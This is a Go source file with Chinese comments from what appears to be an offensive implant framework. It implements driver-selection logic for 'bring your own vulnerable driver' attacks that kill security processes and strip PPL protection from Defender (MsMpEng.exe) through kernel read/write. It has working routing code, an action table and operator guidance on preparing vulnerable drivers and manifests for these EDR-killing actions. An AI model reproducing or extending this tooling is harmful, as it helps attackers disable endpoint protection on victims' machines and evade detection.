// 动作 → 所需档位 → 选中哪个驱动：**唯一一份**选路纯逻辑（v1.4.0 S6 P0-1）。
//
// 为什么必须收敛成一份纯函数：
//   - 同一个目录在三条路径上被读：可用性预览（GET /sessions/{id}/av-ops）、分级入口
//     （POST /sessions/{id}/av-ops）、既有 6 条链（/edr/byovd-*、/edr/ppl-kill）。
//     各自写一套"挑哪个驱动"的代码，必然漂移成"预览说有 rw 档、下发却挑到 kill 档"，
//     而症状是下发成功但目标机必然失败 —— 最难查的一类问题；
//   - 多驱动时必须有**确定性**的选择顺序（档位专一度 → 名称 → 文件名 → 路径），
//     否则"同一份目录、两次下发挑到不同驱动"，复现与审计都无从谈起。
//
// 本文件的函数全部不读盘、不调用系统 API、不依赖时间与随机数：输入是
// ProfileSummary（目录摘要）+ RouteRequest（请求与会话状态），输出是选中的档案或
// RouteError（带中文原因）。因此"单一/多驱动选择、缺档拒绝、点评名档位不符"这些分支
// 都能被单测覆盖，不需要真机、也不需要真实 .sys。
//
// ⚠️ 本文件只决定"挑哪个驱动"，**不判断驱动是否真能加载**（哈希/签名自检在 verify.go，
// 实际加载成功与否只有目标机知道）。Route 的结论里因此带 Notes，调用方必须原样回显。
package drivers

import (
	"fmt"
	"sort"
	"strings"
)

// 档位常量（manifest 的 purpose 字段取值）。
const (
	PurposeKill = "kill"
	PurposeRW   = "rw"
	PurposeBoth = "both"
)

// NormalizePurpose 归一化 purpose 写法（去空白 + 小写；空值原样返回空）。
func NormalizePurpose(p string) string {
	return strings.ToLower(strings.TrimSpace(p))
}

// purposeSatisfies 纯逻辑：声明档位 declared 是否满足所需档位 required。
//
//	required=kill → declared ∈ {kill, both}
//	required=rw   → declared ∈ {rw, both}
//	required=""   → 恒真（该动作不需要本机档位）
//
// 未声明 purpose（空串）**不满足任何档位**：把"没写 purpose"当成"通用驱动"会让一个
// 未标注的驱动被静默用于 PPL 清除这类高危动作，必须在选路阶段就明确拒绝并提示补全。
func purposeSatisfies(declared, required string) bool {
	d, r := NormalizePurpose(declared), NormalizePurpose(required)
	switch r {
	case PurposeKill, PurposeRW:
		return d == r || d == PurposeBoth
	case "":
		return true
	}
	return false
}

// purposeRank 纯逻辑：同一需求下按"档位专一度"排序（越小越优先）。
func purposeRank(declared, required string) int {
	d, r := NormalizePurpose(declared), NormalizePurpose(required)
	if d == r {
		return 0
	}
	if d == PurposeBoth {
		return 1
	}
	return 99
}

// Requirement 一个动作对驱动档位的要求（动作名 → 需求的**唯一一份**口径）。
type Requirement struct {
	// Action 动作名（avops 动作 / 既有路由对应的动作）。
	Action string `json:"action"`
	// Need 需要的档位：kill / rw / ""（不需要从本机目录挑驱动）。
	Need string `json:"need,omitempty"`
	// NeedDeviceIOCTL 是否还要求档案里填了 device + ioctl（byovd_kill 的终止 IOCTL 是必需参数）。
	NeedDeviceIOCTL bool `json:"need_device_ioctl"`
	// NeedServiceName 是否必须有服务名（byovd_load / byovd_unload）。
	NeedServiceName bool `json:"need_service_name"`
	// Reason 为什么需要这一档（中文，直接给操作员看，不做技术黑话）。
	Reason string `json:"reason"`
	// Fix 需要操作员做什么（中文：放什么文件、manifest 怎么写）。
	Fix string `json:"fix"`
}

// requirementList 动作 → 档位需求表。未知动作一律拒绝（fail-closed），不"猜一个档位"。
var requirementList = []Requirement{
	{
		Action: "byovd_kill", Need: PurposeKill, NeedDeviceIOCTL: true,
		Reason: "结束进程走的是驱动的无鉴权终止 IOCTL，因此需要一个 kill 档（或 kill+rw 兼顾的 both 档）" +
			"并且档案里填了设备名与终止 IOCTL —— 少任何一项，任务下发出去也只能失败",
		Fix: `把驱动 .sys 放进驱动目录，并在同目录 manifest.json 里声明 {"file":"xxx.sys","name":"xxx",` +
			`"purpose":"kill","device":"\\\\.\\xxx","ioctl":"0x??????"}`,
	},
	{
		Action: "ppl_kill", Need: PurposeRW,
		Reason: "PPL 保护进程（Defender MsMpEng.exe 等）不能靠终止 IOCTL 结束，需要具备内核读写（能改 " +
			"EPROCESS.Protection）的 rw 档驱动；既有句柄窃取路线对 PPL 进程通常失败，本入口不再让你「试一下」",
		Fix: `把具备内核读写的 .sys 放进驱动目录，并在 manifest.json 里声明 "purpose":"rw"（或 "purpose":"both"），` +
			`例如 {"file":"rwdrv.sys","name":"rwdrv","purpose":"rw"}`,
	},
	{
		Action: "byovd_load", Need: "", NeedServiceName: true,
		Reason: "加载的驱动字节由请求携带（driver_b64），不需要本机目录里已有同档驱动；" +
			"但必须给出 service_name（决定落盘文件名与 SCM 服务名），并且要把这一档声明清楚，" +
			"后续 byovd_kill / ppl_kill 才能按档位自动选到它",
		Fix: `在 params 里给 service_name；若希望按档位自动选路，再用 name 指向 manifest.json 里的档案` +
			`（或直接给 params.purpose ∈ {kill, rw, both}）`,
	},
	{
		Action: "byovd_unload", Need: "", NeedServiceName: true,
		Reason: "卸载是按 SCM 服务名停止并删除内核服务与 .sys 文件（植入端只认服务名），" +
			"因此必须有服务名；服务名可以来自请求、本会话登记过的档案，或服务端台账里记录过的加载",
		Fix: "在 params 里给 service_name（服务名 = 加载时用的那个；也可用 GET /api/v1/drivers/ledger 查台账）",
	},
}

// RequirementFor 查动作的档位需求。ok=false 表示动作不在表里（调用方必须拒绝）。
func RequirementFor(action string) (Requirement, bool) {
	a := strings.ToLower(strings.TrimSpace(action))
	for _, r := range requirementList {
		if r.Action == a {
			return r, true
		}
	}
	return Requirement{}, false
}

// Requirements 返回档位需求表副本（供接口自解释 / 单测对照）。
func Requirements() []Requirement {
	out := make([]Requirement, len(requirementList))
	copy(out, requirementList)
	return out
}

// 选路来源（RouteResult.Source）：写清楚"这个驱动是怎么被挑中的"，便于排障与审计。
const (
	// RouteSourceExplicit 请求里直接给了 device+ioctl（既有语义：绕过档位核对）。
	RouteSourceExplicit = "explicit"
	// RouteSourceProfile 请求里点名了驱动档案（params.driver / params.name）。
	RouteSourceProfile = "profile"
	// RouteSourceSession 本会话此前加载/登记过的驱动档案。
	RouteSourceSession = "session"
	// RouteSourceCatalog 按档位从驱动目录自动挑（确定性顺序，见 selectProfile）。
	RouteSourceCatalog = "catalog"
	// RouteSourcePayload 驱动字节随请求携带（byovd_load）。
	RouteSourcePayload = "request_payload"
	// RouteSourceServiceName 只按服务名定位（byovd_unload）。
	RouteSourceServiceName = "service_name"
)

// RouteRequest 选路输入（全部是纯数据：请求参数 + 会话登记 + 目录摘要，便于单测直接构造）。
type RouteRequest struct {
	Action string
	// ExplicitDevice / ExplicitIOCTL 请求显式指定的设备名与 IOCTL。
	ExplicitDevice string
	ExplicitIOCTL  uint32
	// RequestedName 请求点名的驱动档案（byovd_kill 的 params.driver、byovd_load 的 params.name）。
	RequestedName string
	// ServiceName 请求给出的 SCM 服务名（byovd_load / byovd_unload）。
	ServiceName string
	// DeviceName / KillIOCTL byovd_load 请求里携带的设备名与终止 IOCTL（可空）。
	DeviceName string
	KillIOCTL  uint32
	// DeclaredPurpose byovd_load 请求里显式声明的档位（可空：空则用 manifest 声明，再空则按 kill 兜底）。
	DeclaredPurpose string
	// Session 本会话此前加载/登记过的驱动档案（可空）。
	Session *Driver
	// LedgerServices 服务端台账里"本会话加载过"的服务名（**按时间倒序**，byovd_unload 的兜底来源）。
	// 顺序由调用方保证（drivers.Ledger.PendingForSession 已排序），函数本身不再依赖时间。
	LedgerServices []string
	// AllowExplicit 是否允许"请求显式给 device+ioctl"绕过档位核对。
	// byovd_kill 的既有语义允许（操作员手填设备名与 IOCTL），此时选路只回显、不校验档位。
	AllowExplicit bool
}

// RouteResult 选路结论。
type RouteResult struct {
	Action string `json:"action"`
	// Source 选路来源（explicit/profile/session/catalog/request_payload/service_name）。
	Source string `json:"source"`
	// Driver 选中的档案（可能只填了 Service/Device/IOCTL/Purpose 等与本次用途相关的字段）。
	Driver Driver `json:"driver"`
	// Purpose 选中的档位（byovd_load 时是"加载后要登记的档位"）。
	Purpose string `json:"purpose,omitempty"`
	// Detail 一句话中文说明（回显给操作员，也是审计里唯一该出现的描述）。
	Detail string `json:"detail"`
	// Notes 不阻断下发的提示（例如"显式指定未核对档位""点评名的驱动不在目录里"）。
	Notes []string `json:"notes,omitempty"`
}

// RouteError 选路失败（可判定的纯数据错误：调用方按 Code 决定 HTTP 码与文案）。
type RouteError struct {
	// Code 机器可读错误码（见 routeCode* 常量）。
	Code string `json:"code"`
	// Message 中文原因（含"缺哪一档 / 当前有哪些档 / 需要操作员放什么文件"）。
	Message string `json:"message"`
}

func (e *RouteError) Error() string { return e.Message }

// 选路失败的错误码（avops 层把它映射成 409 driver_unavailable / 400 params_invalid）。
const (
	// RouteCodeUnknownAction 动作不在档位需求表里（fail-closed）。
	RouteCodeUnknownAction = "unknown_action"
	// RouteCodeUnknownPurpose 声明的 purpose 不是 kill/rw/both。
	RouteCodeUnknownPurpose = "unknown_purpose"
	// RouteCodeNoDriver 目录里没有任何满足该档位的驱动。
	RouteCodeNoDriver = "no_driver_for_purpose"
	// RouteCodeNamedProfileMissing 点名的驱动档案不存在。
	RouteCodeNamedProfileMissing = "named_profile_missing"
	// RouteCodeNamedPurposeMismatch 点名的驱动档案档位不符（例如拿 rw 档去 byovd_kill）。
	RouteCodeNamedPurposeMismatch = "named_purpose_mismatch"
	// RouteCodeSessionPurposeMismatch 本会话登记的驱动档位不符（且没有其它可用来源）。
	RouteCodeSessionPurposeMismatch = "session_purpose_mismatch"
	// RouteCodeProfileIncomplete 点名的档案缺 device/ioctl（选了也发不出终止 IOCTL）。
	RouteCodeProfileIncomplete = "profile_incomplete"
	// RouteCodeMissingServiceName 没有服务名可用（byovd_load / byovd_unload）。
	RouteCodeMissingServiceName = "missing_service_name"
	// RouteCodeDirectionMismatch byovd_unload 的 service_name 与请求点名的档案对不上（防误删别的服务）。
	RouteCodeDirectionMismatch = "service_name_mismatch"
)

// Route 纯函数：按动作的档位需求选出一个驱动档案，或给出明确的中文拒绝原因。
//
// 优先级（对 byovd_kill / ppl_kill）：
//  1. 请求显式给的 device+ioctl（仅 AllowExplicit；回显一条"未核对档位"的 Notes）；
//  2. 请求点名的驱动档案（params.driver / params.name）—— 点名了就用它，档位不符**明确拒绝**
//     而不是悄悄换一个（操作员点名 = 他想要这个驱动，静默替换是安全事故）；
//  3. 本会话此前登记/加载过的档案；
//  4. 目录里按档位自动挑（selectProfile 的确定性顺序）。
//
// byovd_load 的"选路"是：确认 service_name、解析这一档是什么（请求声明 → manifest 声明 → 兜底 kill）、
// 并给出加载后要登记的档位；byovd_unload 的"选路"是：解析出要卸载的服务名（请求 → 会话档案 → 台账）。
func Route(sum ProfileSummary, req RouteRequest) (RouteResult, error) {
	r, ok := RequirementFor(req.Action)
	if !ok {
		return RouteResult{}, &RouteError{
			Code: RouteCodeUnknownAction,
			Message: fmt.Sprintf("未知动作 %q：驱动选路表里没有登记（fail-closed，拒绝下发；"+
				"可选动作见 GET /api/v1/av-ops 的 tiers[].actions）", req.Action),
		}
	}

	switch req.Action {
	case "byovd_load":
		return routeLoad(sum, req, r)
	case "byovd_unload":
		return routeUnload(sum, req, r)
	default:
		return routeKillLike(sum, req, r)
	}
}

// routeLoad byovd_load 的选路：驱动字节随请求携带，所以**不需要**本机目录里已有同档驱动；
// 要确定的是"以哪一档登记"与"设备名/IOCTL 用什么"，后续 byovd_kill / ppl_kill 才能自动选到它。
func routeLoad(sum ProfileSummary, req RouteRequest, r Requirement) (RouteResult, error) {
	svc := strings.TrimSpace(req.ServiceName)
	if svc == "" {
		return RouteResult{}, &RouteError{
			Code: RouteCodeMissingServiceName,
			Message: "byovd_load 缺 service_name：" + r.Reason + "。" + r.Fix +
				"（注意：服务名不是从目录里猜的，它决定落盘文件名 %SystemRoot%\\System32\\drivers\\<service_name>.sys）",
		}
	}

	// 档位来源：请求显式声明 → manifest 里点名档案的声明 → 兜底 kill。
	// 兜底 kill 是**既有行为**（legacy byovd_load 一直按 kill 登记），不能默默改成 rw/both：
	// 那会让一个本来只用于终止进程的驱动被 ppl_kill 当成 rw 档选走。
	declared := NormalizePurpose(req.DeclaredPurpose)
	profile, hasProfile := Driver{}, false
	if n := strings.TrimSpace(req.RequestedName); n != "" {
		profile, hasProfile = sum.FindMeta(n)
		if declared == "" && hasProfile {
			declared = NormalizePurpose(profile.Purpose)
		}
	}
	if declared != "" && declared != PurposeKill && declared != PurposeRW && declared != PurposeBoth {
		return RouteResult{}, &RouteError{
			Code: RouteCodeUnknownPurpose,
			Message: fmt.Sprintf("purpose 只支持 kill / rw / both 三档，收到 %q：请改用这三档之一"+
				"（kill = 提供无鉴权终止 IOCTL；rw = 具备内核读写；both = 两者兼顾）", req.DeclaredPurpose),
		}
	}
	fallback := false
	if declared == "" {
		declared = PurposeKill
		fallback = true
	}

	d := Driver{
		Name:    firstNonEmpty(strings.TrimSpace(req.RequestedName), svc),
		Service: svc,
		Device:  strings.TrimSpace(req.DeviceName),
		IOCTL:   req.KillIOCTL,
		Purpose: declared,
	}
	if hasProfile {
		if d.Device == "" {
			d.Device = profile.Device
		}
		if d.IOCTL == 0 {
			d.IOCTL = profile.IOCTL
		}
	}
	// 设备名规范化：与既有 byovd_load 路由一致（补上 \\.\ 前缀）。
	if d.Device != "" && !strings.HasPrefix(d.Device, `\\`) {
		d.Device = `\\.\` + strings.TrimPrefix(d.Device, `\`)
	}

	res := RouteResult{
		Action:  req.Action,
		Source:  RouteSourcePayload,
		Driver:  d,
		Purpose: declared,
		Detail: fmt.Sprintf("驱动字节随请求携带（service_name=%s，按 %s 档登记）；"+
			"加载结果由目标机决定，服务端只做哈希/签名自检与登记", svc, declared),
	}
	if fallback {
		res.Notes = append(res.Notes, "请求与目录都没声明 purpose，按既有行为以 kill 档登记；"+
			`若这个驱动其实具备内核读写，请在 manifest.json 里写 "purpose":"rw"（或 "both"）后再加载，`+
			"否则 ppl_kill 不会自动选到它")
	}
	if !hasProfile && strings.TrimSpace(req.RequestedName) != "" {
		res.Notes = append(res.Notes, fmt.Sprintf("点名的驱动档案 %q 不在驱动目录里：加载仍可继续（字节随请求携带），"+
			"但无法复用它的 sha256/签名声明做核对，也无法从中补 device/ioctl", req.RequestedName))
	}
	if d.Device == "" || d.IOCTL == 0 {
		res.Notes = append(res.Notes, "档案里没有完整的 device+ioctl：加载本身不受影响，"+
			"但后续 byovd_kill 用不了它（那时必须在请求里显式给 device+ioctl）")
	}
	return res, nil
}

// routeUnload byovd_unload 的选路：解析出要卸载的 SCM 服务名。
// 服务名来源优先级：请求 → 本会话登记的档案 → 服务端台账（本会话加载过的服务名，时间倒序）。
func routeUnload(sum ProfileSummary, req RouteRequest, r Requirement) (RouteResult, error) {
	svc := strings.TrimSpace(req.ServiceName)
	source := "request"
	if svc == "" && req.Session != nil {
		svc = strings.TrimSpace(req.Session.Service)
		if svc == "" {
			svc = strings.TrimSpace(req.Session.Name)
		}
		source = RouteSourceSession
	}
	if svc == "" {
		for _, s := range req.LedgerServices {
			if s = strings.TrimSpace(s); s != "" {
				svc = s
				source = "ledger"
				break
			}
		}
	}
	if svc == "" {
		return RouteResult{}, &RouteError{
			Code: RouteCodeMissingServiceName,
			Message: "byovd_unload 缺 service_name：" + r.Reason +
				"；请求里没给、本会话也没有登记过驱动、服务端台账里也没有该会话的加载记录。" + r.Fix,
		}
	}

	// 请求给了 service_name 时以请求为准（**不**因为"与本会话登记的档案不同"而拒绝）：
	// 清场场景下操作员经常要卸载一个不是当前登记档案的服务（例如上一次会话留下的），
	// 这里拒绝等于把清场路径堵死。只回显一条提示，说明二者不同。
	var notes []string
	if req.Session != nil && strings.TrimSpace(req.ServiceName) != "" {
		reg := firstNonEmpty(strings.TrimSpace(req.Session.Service), strings.TrimSpace(req.Session.Name))
		if reg != "" && !strings.EqualFold(reg, svc) {
			notes = append(notes, fmt.Sprintf("请求卸载的服务名 %s 与本会话登记的驱动档案 %s（service=%s）不是同一个："+
				"本次只按服务名卸载，不会改动登记档案", svc, req.Session.Name, reg))
		}
	}

	d := Driver{Name: svc, Service: svc}
	if req.Session != nil && strings.TrimSpace(req.ServiceName) == "" {
		// 服务名来自会话档案时，档案本身就是要卸载的对象，直接用它的元数据。
		d = *req.Session
		if strings.TrimSpace(d.Service) == "" {
			d.Service = svc
		}
	}
	// 目录里有这个服务名的档案时补上元数据（档位/设备），并在详述里写清楚；
	// 没有也**不拒绝**：手工加载（不经过本服务端）的驱动同样需要能卸载。
	known, found := sum.FindByService(svc)

	res := RouteResult{Action: req.Action, Source: RouteSourceServiceName, Driver: d, Purpose: d.Purpose}
	switch {
	case found:
		if d.Name == "" || d.Name == svc {
			d.Name = known.Name
			res.Driver = d
		}
		res.Detail = fmt.Sprintf("按服务名卸载 %s（驱动目录里命中档案 %s，purpose=%s）", svc, known.Name, known.Purpose)
	default:
		res.Detail = fmt.Sprintf("按服务名卸载 %s（驱动目录/manifest 里没有该服务名的档案：可能是手工加载或已被移走的驱动，仍按服务名卸载）", svc)
		res.Notes = append(res.Notes, "该服务名不在服务端驱动目录的记录里：服务端无法核对它是否由本工具加载；"+
			"请确认服务名正确（卸载会停止服务并删除 %SystemRoot%\\System32\\drivers\\<service_name>.sys，文件不可恢复）")
	}
	if source == RouteSourceSession {
		res.Notes = append(res.Notes, "service_name 不是请求给的，而是从本会话登记的驱动档案解析出来的："+svc)
	} else if source == "ledger" {
		res.Notes = append(res.Notes, "service_name 不是请求给的，而是从服务端加载台账（GET /api/v1/drivers/ledger）解析出来的："+svc)
	}
	res.Notes = append(res.Notes, notes...)
	return res, nil
}

// routeKillLike byovd_kill / ppl_kill 的选路：要的是一个能满足档位需求（byovd_kill 还要求
// device+ioctl 齐全）的**已在本机存在**的驱动档案。
func routeKillLike(sum ProfileSummary, req RouteRequest, r Requirement) (RouteResult, error) {
	// ① 请求显式给 device+ioctl：既有语义允许绕过档位核对。
	//    刻意**不**在这里做档位校验：这是操作员手填的驱动，目录里可能根本没有它的档案
	//    （例如驱动是手工加载的）；但必须回显"未核对"这一事实。
	if req.AllowExplicit {
		dev := strings.TrimSpace(req.ExplicitDevice)
		if dev != "" && req.ExplicitIOCTL != 0 {
			d := Driver{Device: dev, IOCTL: req.ExplicitIOCTL}
			// 目录里能按设备名对上档案时补上名字/服务名/档位，纯粹为了回显更清楚
			// （不改判定：显式指定一律放行，不核对档位）。
			for _, c := range sum.Drivers {
				if strings.EqualFold(strings.TrimSpace(c.Device), dev) {
					d.Name, d.Purpose, d.Service = c.Name, c.Purpose, c.Service
					break
				}
			}
			return RouteResult{
				Action: req.Action,
				Source: RouteSourceExplicit,
				Driver: d,
				Detail: fmt.Sprintf("使用请求显式指定的驱动：device=%s ioctl=0x%06X", dev, req.ExplicitIOCTL),
				Notes: []string{"device+ioctl 由请求显式给出：跳过了档位（purpose）核对，" +
					"服务端无法确认它来自 " + r.Need + " 档驱动，请自行确认这是你有权使用的驱动"},
			}, nil
		}
	}

	// ② 请求点名的驱动档案：点名了就按它，档位不符明确拒绝（不静默替换）。
	//
	// 这里对"未声明 purpose"刻意**比自动选路宽松**，是为了不破坏既有行为：
	//   - 自动选路要求 purpose 明确（未声明 ≠ 通用，否则一个没标注的驱动会被静默用于 ppl_kill
	//     这类高危动作）；
	//   - 但操作员**点名**了某个驱动时，他是明确要用这个驱动（既有 byovd_kill 的语义就是
	//     "点名即可用"），老 manifest 只写了 device/ioctl、没写 purpose 的情况必须继续能用 ——
	//     所以放行 + 一条醒目提示，而不是把老配置一棍子打死。
	//   - "声明了但档位不符"（例如 rw 档拿去做 byovd_kill）仍然拒绝：那不是配置陈旧，
	//     而是拿错了驱动，静默放行只会让任务在目标机上必然失败。
	if n := strings.TrimSpace(req.RequestedName); n != "" {
		d, ok := sum.FindMeta(n)
		if !ok {
			return RouteResult{}, &RouteError{
				Code: RouteCodeNamedProfileMissing,
				Message: fmt.Sprintf("未找到驱动档案 %q：当前目录 %s 里共 %d 个 .sys%s；"+
					"请把 .sys 放进该目录并配 manifest.json，或去掉 driver 参数让服务端按 %s 档自动挑。%s",
					n, strings.Join(sum.SearchDirs, " 或 "), sum.Total, namesHint(sum.Names()), r.Need, r.Fix),
			}
		}
		if !purposeSatisfies(d.Purpose, r.Need) && NormalizePurpose(d.Purpose) != "" {
			return RouteResult{}, &RouteError{
				Code: RouteCodeNamedPurposeMismatch,
				Message: fmt.Sprintf("点名的驱动 %q 是 %q 档，本动作需要 %q 档：%s。当前目录档位 %v。%s",
					d.Name, displayPurpose(d.Purpose), r.Need, r.Reason, sum.Purposes, r.Fix),
			}
		}
		if r.NeedDeviceIOCTL && (strings.TrimSpace(d.Device) == "" || d.IOCTL == 0) {
			return RouteResult{}, &RouteError{
				Code: RouteCodeProfileIncomplete,
				Message: fmt.Sprintf("点名的驱动 %q 档案里缺 %s：选了也发不出终止 IOCTL。"+
					"请在 manifest.json 里给该驱动补上 device 与 ioctl（%s）",
					d.Name, incompleteFields(d, r), r.Fix),
			}
		}
		res := RouteResult{
			Action:  req.Action,
			Source:  RouteSourceProfile,
			Driver:  d,
			Purpose: d.Purpose,
			Detail: fmt.Sprintf("使用请求点名的驱动 %s（purpose=%s）%s",
				d.Name, displayPurpose(d.Purpose), deviceIOCTLText(d, r)),
		}
		if NormalizePurpose(d.Purpose) == "" {
			res.Notes = append(res.Notes, fmt.Sprintf("点名的驱动 %q 没有在 manifest.json 里声明 purpose："+
				"本次按「点名即可用」的既有语义放行，但服务端无法核对它是否真的是 %s 档；"+
				`请在 manifest.json 里补上 "purpose":"%s"（或 "both"），自动选路与可用性预览才能把它算进来`,
				d.Name, r.Need, r.Need))
		}
		return res, nil
	}

	// ③ 本会话此前加载/登记过的档案（可能是服务端重启后从台账恢复的，见 Ledger.ProfileFor）。
	var sessionNotes []string
	if req.Session != nil {
		s := *req.Session
		// 既有语义：会话档案里缺的字段允许由请求显式值补齐（同一驱动的两个来源合并），
		// 但**不会**把请求的 device 与另一个来源的 ioctl 拼在一起 —— 那会拼出一个不存在的组合。
		if req.AllowExplicit {
			if strings.TrimSpace(s.Device) == "" && strings.TrimSpace(req.ExplicitDevice) != "" {
				s.Device = strings.TrimSpace(req.ExplicitDevice)
				sessionNotes = append(sessionNotes, "档案里缺 device，用请求里的 device 补齐")
			}
			if s.IOCTL == 0 && req.ExplicitIOCTL != 0 {
				s.IOCTL = req.ExplicitIOCTL
				sessionNotes = append(sessionNotes, "档案里缺 ioctl，用请求里的 ioctl 补齐")
			}
		}
		ok := purposeSatisfies(s.Purpose, r.Need) &&
			(!r.NeedDeviceIOCTL || (strings.TrimSpace(s.Device) != "" && s.IOCTL != 0))
		if ok {
			return RouteResult{
				Action:  req.Action,
				Source:  RouteSourceSession,
				Driver:  s,
				Purpose: s.Purpose,
				Detail: fmt.Sprintf("使用本会话此前登记/加载过的驱动 %s（purpose=%s）%s",
					s.Name, displayPurpose(s.Purpose), deviceIOCTLText(s, r)),
				Notes: sessionNotes,
			}, nil
		}
	}

	// ④ 目录里按档位自动挑（确定性顺序）。
	if d, ok := selectProfile(sum.Drivers, r.Need, r.NeedDeviceIOCTL); ok {
		others := otherCandidates(sum.Drivers, r.Need, r.NeedDeviceIOCTL, d)
		res := RouteResult{
			Action:  req.Action,
			Source:  RouteSourceCatalog,
			Driver:  d,
			Purpose: d.Purpose,
			Detail: fmt.Sprintf("按 purpose 分档自动选中驱动 %s（purpose=%s）%s",
				d.Name, displayPurpose(d.Purpose), deviceIOCTLText(d, r)),
		}
		res.Notes = append(res.Notes, "自动选路的确定性顺序：档位专一度（专用档优先于 both）→ 档案名 → 文件名 → 路径；"+
			"目录里还有其它满足档位的驱动："+strings.Join(others, ", ")+"（要指定请用 driver 参数点名）")
		return res, nil
	}

	// ⑤ 什么都不满足：明确拒绝，写清"缺哪一档 / 当前有哪些档 / 放什么文件 / 目录在哪"。
	if req.Session != nil && !purposeSatisfies(req.Session.Purpose, r.Need) {
		return RouteResult{}, &RouteError{
			Code: RouteCodeSessionPurposeMismatch,
			Message: fmt.Sprintf("本会话登记的驱动 %q 是 %q 档，本动作需要 %q 档，且目录里也没有可用的 %s 档驱动：%s。"+
				"当前目录 %s 共 %d 个 .sys，档位 %v。%s",
				req.Session.Name, displayPurpose(req.Session.Purpose), r.Need, r.Need, r.Reason,
				strings.Join(sum.SearchDirs, " 或 "), sum.Total, sum.Purposes, r.Fix),
		}
	}
	return RouteResult{}, &RouteError{
		Code:    RouteCodeNoDriver,
		Message: noDriverMessage(req.Action, r, sum),
	}
}

// noDriverMessage 组装"缺档"拒绝文案。要求写全四件事：
// 缺哪一档、为什么需要、当前有哪些档（含未声明 purpose 的数量）、操作员要放什么文件/写什么 manifest。
func noDriverMessage(action string, r Requirement, sum ProfileSummary) string {
	purposes := "（没有任何 .sys 声明 purpose）"
	if len(sum.Purposes) > 0 {
		purposes = strings.Join(sum.Purposes, ", ")
	}
	undeclared := 0
	for _, d := range sum.Drivers {
		if NormalizePurpose(d.Purpose) == "" {
			undeclared++
		}
	}
	extra := ""
	if undeclared > 0 {
		extra = fmt.Sprintf("；其中 %d 个 .sys 没有声明 purpose（不会参与任何档位选路，请在 manifest.json 里补上）", undeclared)
	}
	incomplete := 0
	for _, d := range sum.Drivers {
		if purposeSatisfies(d.Purpose, r.Need) && (strings.TrimSpace(d.Device) == "" || d.IOCTL == 0) {
			incomplete++
		}
	}
	if r.NeedDeviceIOCTL && incomplete > 0 {
		extra += fmt.Sprintf("；另有 %d 个 %s 档驱动缺 device 或 ioctl（byovd_kill 需要二者齐全才能发终止 IOCTL）", incomplete, r.Need)
	}
	return fmt.Sprintf("无 %s 档驱动，%s 不可用：%s。当前驱动目录 %s 共 %d 个 .sys，档位 %s%s。%s",
		r.Need, action, r.Reason, strings.Join(sum.SearchDirs, " 或 "), sum.Total, purposes, extra, r.Fix)
}

// otherCandidates 列出"同样满足档位"的其它档案名（确定性顺序，最多 8 个 + 省略号）。
// 为什么要回显：自动挑中的可能不是操作员预期的那一个（目录里放了好几个），
// 把候选写清楚，他才知道要用 driver 参数点名。
func otherCandidates(cands []Driver, need string, needDeviceIOCTL bool, picked Driver) []string {
	out := make([]string, 0, len(cands))
	for _, d := range cands {
		if d.Name == picked.Name && d.File == picked.File {
			continue
		}
		if !purposeSatisfies(d.Purpose, need) {
			continue
		}
		if needDeviceIOCTL && (strings.TrimSpace(d.Device) == "" || d.IOCTL == 0) {
			continue
		}
		out = append(out, d.Name)
	}
	sort.Strings(out)
	if len(out) > 8 {
		out = append(out[:8], fmt.Sprintf("…（共 %d 个）", len(out)))
	}
	if len(out) == 0 {
		return []string{"（没有其它候选）"}
	}
	return out
}

// namesHint 把候选档案名拼成一段提示（为空时给"目录是空的"）。
func namesHint(names []string) string {
	if len(names) == 0 {
		return "（目录里目前没有任何 .sys 档案）"
	}
	if len(names) > 8 {
		names = append(names[:8], fmt.Sprintf("…（共 %d 个）", len(names)))
	}
	return "（当前有：" + strings.Join(names, ", ") + "）"
}

// displayPurpose 把档位写成中文可读形式（空档位单独说明，避免显示成 ""）。
func displayPurpose(p string) string {
	switch NormalizePurpose(p) {
	case PurposeKill:
		return "kill（进程终止 IOCTL）"
	case PurposeRW:
		return "rw（内核读写）"
	case PurposeBoth:
		return "both（kill+rw 兼顾）"
	default:
		return "未声明 purpose"
	}
}

// deviceIOCTLText 在需要 device/ioctl 的动作里把二者补进详述（不需要时留空）。
func deviceIOCTLText(d Driver, r Requirement) string {
	if !r.NeedDeviceIOCTL {
		return ""
	}
	return fmt.Sprintf("，device=%s ioctl=0x%06X", d.Device, d.IOCTL)
}

// incompleteFields 指出档案缺了哪些必需字段（用于拒绝文案）。
func incompleteFields(d Driver, r Requirement) string {
	var miss []string
	if r.NeedDeviceIOCTL {
		if strings.TrimSpace(d.Device) == "" {
			miss = append(miss, "device（设备名）")
		}
		if d.IOCTL == 0 {
			miss = append(miss, "ioctl（终止 IOCTL）")
		}
	}
	if len(miss) == 0 {
		return "必需字段"
	}
	return strings.Join(miss, " 与 ")
}

// firstNonEmpty 取第一个非空字符串（空串返回空串）。
func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}
